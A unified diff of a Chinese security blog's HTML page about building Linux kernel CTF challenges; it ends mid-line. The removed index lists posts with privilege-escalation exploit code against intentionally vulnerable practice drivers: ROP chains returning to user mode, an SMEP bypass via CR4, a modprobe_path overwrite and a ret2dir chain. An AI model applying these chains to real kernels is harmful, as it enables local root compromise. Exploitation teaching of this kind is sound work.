@@ -4,14 +4,19 @@
   <meta charset="utf-8">
   
   
-  <title>zt20xx</title>
+  <title>kernel-出题-pte_pud重叠 | zt20xx</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="zt20xx">
-<meta property="og:url" content="https://zt20xx.github.io/index.html">
+  <meta name="description" content="简单的驱动复现（__free_page 直接简化） 漏洞利用（根据CVE-2024-1086简化）  虚拟地址到物理地址用户在linux下使用的是虚拟地址，通过gdb调试的也是虚拟地址 对于以下用户态代码 12mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel-出题-pte_pud重叠">
+<meta property="og:url" content="https://zt20xx.github.io/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-pte_pud%E9%87%8D%E5%8F%A0/index.html">
 <meta property="og:site_name" content="zt20xx">
+<meta property="og:description" content="简单的驱动复现（__free_page 直接简化） 漏洞利用（根据CVE-2024-1086简化）  虚拟地址到物理地址用户在linux下使用的是虚拟地址，通过gdb调试的也是虚拟地址 对于以下用户态代码 12mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-11-26T15:16:18.000Z">
+<meta property="article:modified_time" content="2024-12-03T15:53:35.275Z">
 <meta property="article:author" content="zt20xx">
+<meta property="article:tag" content="kernel">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="zt20xx" type="application/atom+xml">
@@ -67,249 +72,7 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-tmp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2048/10/24/tmp/" class="article-date">
-  <time class="dt-published" datetime="2048-10-24T14:05:03.000Z" itemprop="datePublished">2048-10-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2048/10/24/tmp/">tmp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>每隔一段时间再看之前写的东西，就很疑惑，我在干什么？目的是什么？有必要吗？<br>随便做做，消磨时间，没必要是必要的。</p>
-<p>放养的个人博客</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2048/10/24/tmp/" data-id="cm3x49dre0000iy7o89le5r19" data-title="tmp" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-kernel/kernel-出题-check" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-check/" class="article-date">
-  <time class="dt-published" datetime="2024-11-26T15:25:13.000Z" itemprop="datePublished">2024-11-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-check/">kernel-出题-ret2user</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>先用简单的代码，检测一下，选择的内核是否可以通过<code>commit_creds(prepare_kernel_cred(0))</code>实现提权</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pwn_ioctl</span><span class="params">(<span class="keyword">struct</span> file *fd, <span class="type">unsigned</span> <span class="type">int</span> a2,<span class="type">unsigned</span> <span class="type">long</span>  a3)</span></span><br><span class="line">&#123;</span><br><span class="line">        backdoor();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Start pwn!\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> fd=open(<span class="string">&quot;/proc/pwn&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        ioctl(fd,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-check/" data-id="cm48n2it300018n7oecak7mmw" data-title="kernel-出题-ret2user" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-kernel/kernel-出题-ret2user" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2user/" class="article-date">
-  <time class="dt-published" datetime="2024-11-26T15:25:13.000Z" itemprop="datePublished">2024-11-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2user/">kernel-出题-ret2user</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>驱动漏洞点</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">pwn_write</span><span class="params">(<span class="keyword">struct</span> file *fd,<span class="type">const</span> <span class="type">char</span> *buf,<span class="type">size_t</span> count,<span class="type">loff_t</span> *ops)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> data[<span class="number">64</span>];</span><br><span class="line">        <span class="built_in">memset</span>(data,<span class="string">&#x27;a&#x27;</span>,<span class="number">64</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(data,buf,count);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>直接使用了来着用户态的数据长度。</p>
-<p>在关闭smap，smep，kalsr之后，且kallsyms泄露内核地址后，有如下exp</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rop_base</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">        rop[i++]=SWAPGS_POPFQ_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0</span>;</span><br><span class="line">        rop[i++]=IRETQ_RET+ko_offset;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)get_shell;</span><br><span class="line">        rop[i++]=user_cs;</span><br><span class="line">        rop[i++]=user_rflags;</span><br><span class="line">        rop[i++]=user_sp;</span><br><span class="line">        rop[i++]=user_ss;</span><br><span class="line">        <span class="type">int</span> fd=open(<span class="string">&quot;/proc/pwn&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        write(fd,rop,<span class="keyword">sizeof</span>(rop));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里只简单说明一下要注意的地方</p>
-<ol>
-<li>内核由于优化，可能不使用rbp，而是只使用rsp。所有与用户态pwn不同，可能不需要覆盖rbp</li>
-<li>在返回用户态后也可能出现xmm对齐的问题，此时的对齐不需要修改rop，而是可以直接内嵌汇编。如下所示：</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getuid())&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;fail, no root&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                __asm__ (</span><br><span class="line">                                <span class="string">&quot;pop rax;&quot;</span></span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="swapgs-restore-regs-and-return-to-usermode"><a href="#swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="swapgs_restore_regs_and_return_to_usermode"></a>swapgs_restore_regs_and_return_to_usermode</h2><p>除了使用swapgs;popfq配合iretq还可以使用<code>swapgs_restore_regs_and_return_to_usermode</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/25i swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">   0xffffffff81c00a6f &lt;common_interrupt+47&gt;:</span><br><span class="line">    jmp    0xffffffff81c00a8a &lt;common_interrupt+74&gt;</span><br><span class="line">   0xffffffff81c00a71 &lt;common_interrupt+49&gt;:    mov    ecx,0x48</span><br><span class="line">   0xffffffff81c00a76 &lt;common_interrupt+54&gt;:</span><br><span class="line">    mov    rdx,QWORD PTR gs:0x19d48</span><br><span class="line">   0xffffffff81c00a7f &lt;common_interrupt+63&gt;:</span><br><span class="line">    and    edx,0xfffffffe</span><br><span class="line">   0xffffffff81c00a82 &lt;common_interrupt+66&gt;:    mov    eax,edx</span><br><span class="line">   0xffffffff81c00a84 &lt;common_interrupt+68&gt;:    shr    rdx,0x20</span><br><span class="line">   0xffffffff81c00a88 &lt;common_interrupt+72&gt;:    wrmsr</span><br><span class="line">   0xffffffff81c00a8a &lt;common_interrupt+74&gt;:    pop    r15</span><br><span class="line">   0xffffffff81c00a8c &lt;common_interrupt+76&gt;:    pop    r14</span><br><span class="line">   0xffffffff81c00a8e &lt;common_interrupt+78&gt;:    pop    r13</span><br><span class="line">   0xffffffff81c00a90 &lt;common_interrupt+80&gt;:    pop    r12</span><br><span class="line">   0xffffffff81c00a92 &lt;common_interrupt+82&gt;:    pop    rbp</span><br><span class="line">   0xffffffff81c00a93 &lt;common_interrupt+83&gt;:    pop    rbx</span><br><span class="line">   0xffffffff81c00a94 &lt;common_interrupt+84&gt;:    pop    r11</span><br><span class="line">   0xffffffff81c00a96 &lt;common_interrupt+86&gt;:    pop    r10</span><br><span class="line">   0xffffffff81c00a98 &lt;common_interrupt+88&gt;:    pop    r9</span><br><span class="line">   0xffffffff81c00a9a &lt;common_interrupt+90&gt;:    pop    r8</span><br><span class="line">   0xffffffff81c00a9c &lt;common_interrupt+92&gt;:    pop    rax</span><br><span class="line">   0xffffffff81c00a9d &lt;common_interrupt+93&gt;:    pop    rcx</span><br><span class="line">   0xffffffff81c00a9e &lt;common_interrupt+94&gt;:    pop    rdx</span><br><span class="line">   0xffffffff81c00a9f &lt;common_interrupt+95&gt;:    pop    rsi</span><br><span class="line">   0xffffffff81c00aa0 &lt;common_interrupt+96&gt;:    mov    rdi,rsp</span><br><span class="line">   0xffffffff81c00aa3 &lt;common_interrupt+99&gt;:</span><br><span class="line">    mov    rsp,QWORD PTR gs:0x5004</span><br><span class="line">   0xffffffff81c00aac &lt;common_interrupt+108&gt;:</span><br><span class="line">    push   QWORD PTR [rdi+0x30]</span><br><span class="line">   0xffffffff81c00aaf &lt;common_interrupt+111&gt;:</span><br><span class="line">    push   QWORD PTR [rdi+0x28]</span><br></pre></td></tr></table></figure>
-<p>直接从<code>mov rdi, rsp</code> 开始，<br>这个编译的内核其地址对应<code>swapgs_restore_regs_and_return_to_usermode+0x31</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rop_swapgs</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">        rop[i++]= <span class="number">0xffffffff81c00aa0</span>;</span><br><span class="line">        rop[i++]= <span class="number">0</span>;</span><br><span class="line">        rop[i++]= <span class="number">0</span>;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)get_shell;</span><br><span class="line">        rop[i++]=user_cs;</span><br><span class="line">        rop[i++]=user_rflags;</span><br><span class="line">        rop[i++]=user_sp;</span><br><span class="line">        rop[i++]=user_ss;</span><br><span class="line">        <span class="type">int</span> fd=open(<span class="string">&quot;/proc/pwn&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        write(fd,rop,<span class="keyword">sizeof</span>(rop));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> ELF</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kernel = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/zt/git/test-main/linux-4.19.324/vmlinux&#x27;</span></span><br><span class="line">    Arch:       amd64-<span class="number">64</span>-little</span><br><span class="line">    Version:    <span class="number">4.19</span><span class="number">.324</span></span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (<span class="number">0xffffffff81000000</span>)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="built_in">next</span>(kernel.search(<span class="string">b&quot;/sbin/modprobe\0&quot;</span>)))</span><br><span class="line"><span class="string">&#x27;0xffffffff82442400&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modprobe_trigger_memfd</span><span class="params">()</span>  <span class="comment">//直接在内存中触发</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">char</span> *argv_envp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">	write(fd, <span class="string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	fexecve(fd, &amp;argv_envp, &amp;argv_envp);</span><br><span class="line">	</span><br><span class="line">	close(fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">some_for_modprobe</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        FILE*  fd=fopen(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line">        fgets(buf,<span class="number">8</span>,fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;/proc/sys/kernel/modprobe: %s\n&quot;</span>,buf);</span><br><span class="line">        modprobe_trigger_memfd();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rop_modprobe</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        rop[i++]=POP_RAX_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0x6c6976652f</span>; <span class="comment">// rax: /evil</span></span><br><span class="line">        rop[i++]=POP_RDI_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0xffffffff82442400</span>;</span><br><span class="line">        rop[i++]=MOV__RDI__RAX_RET+ko_offset;<span class="comment">//mov [rdi],rax;ret</span></span><br><span class="line">        rop[i++]=SWAPGS_POPFQ_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0</span>;</span><br><span class="line">        rop[i++]=IRETQ_RET+ko_offset;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)some_for_modprobe;</span><br><span class="line">        rop[i++]=user_cs;</span><br><span class="line">        rop[i++]=user_rflags;</span><br><span class="line">        rop[i++]=user_sp;</span><br><span class="line">        rop[i++]=user_ss;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> fd=open(<span class="string">&quot;/proc/pwn&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        write(fd,rop,<span class="keyword">sizeof</span>(rop));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br></pre></td></tr></table></figure>
-
-<h2 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h2><p>smep绕过，这个只需要修改cr4就可以了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rop_bypass_smep</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        rop[i++]=POP_RDI_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">        rop[i++]=MOV_CR4_RDI_RET+ko_offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2user/" data-id="cm48n2it700088n7oehib5go3" data-title="kernel-出题-ret2user" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-kernel/kernel-出题-double_fetch" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-double_fetch/" class="article-date">
-  <time class="dt-published" datetime="2024-11-26T15:25:08.000Z" itemprop="datePublished">2024-11-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-double_fetch/">kernel-出题-double_fetch</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>太草率了，之后再改</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zt20xx.github.io/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-double_fetch/" data-id="cm48n2it400028n7o5yrsdbpf" data-title="kernel-出题-double_fetch" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-kernel/kernel-出题-ret2dir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2dir/" class="article-date">
-  <time class="dt-published" datetime="2024-11-26T15:25:08.000Z" itemprop="datePublished">2024-11-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/11/26/kernel/kernel-%E5%87%BA%E9%A2%98-ret2dir/">kernel-出题-ret2dir</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pwn_ioctl</span><span class="params">(<span class="keyword">struct</span> file *fd,<span class="type">unsigned</span> <span class="type">int</span> a1,<span class="type">unsigned</span> <span class="type">long</span> a2)</span>&#123;</span><br><span class="line">        jmp_addr=a2;</span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">                        <span class="string">&quot;mov rax,[jmp_addr];&quot;</span></span></span><br><span class="line"><span class="params">                        <span class="string">&quot;mov rsp,rax;&quot;</span></span></span><br><span class="line"><span class="params">                        <span class="string">&quot;mov rbx,rax;&quot;</span></span></span><br><span class="line"><span class="params">                        <span class="string">&quot;jmp [rax];ret;&quot;</span></span></span><br><span class="line"><span class="params">                        )</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>直接使用汇编实现了，就是对a2进行了 解引用</p>
-<p>将rop直接写在mmap分配的地址里面</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">write_rop_chain</span><span class="params">(<span class="type">size_t</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; i &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); i++)</span><br><span class="line">                rop[i] = ADD_RSP_0X320_RET+ko_offset;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); i++)</span><br><span class="line">                rop[i] =RET+ko_offset;</span><br><span class="line">        rop[i++]=POP_RDI_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">        rop[i++]=MOV_CR4_RDI_RET+ko_offset;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)get_root;</span><br><span class="line">        rop[i++]=SWAPGS_POPFQ_RET+ko_offset;</span><br><span class="line">        rop[i++]=<span class="number">0</span>;</span><br><span class="line">        rop[i++]=IRETQ_RET+ko_offset;</span><br><span class="line">        rop[i++]=(<span class="type">size_t</span>)get_shell;</span><br><span class="line">        rop[i++]=user_cs;</span><br><span class="line">        rop[i++]=user_rflags;</span><br><span class="line">        rop[i++]=user_sp;</span><br><span class="line">        rop[i++]=user_ss;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        save_status();</span><br><span class="line">        read_sym();</span><br><span class="line">        <span class="type">size_t</span> try_hit=<span 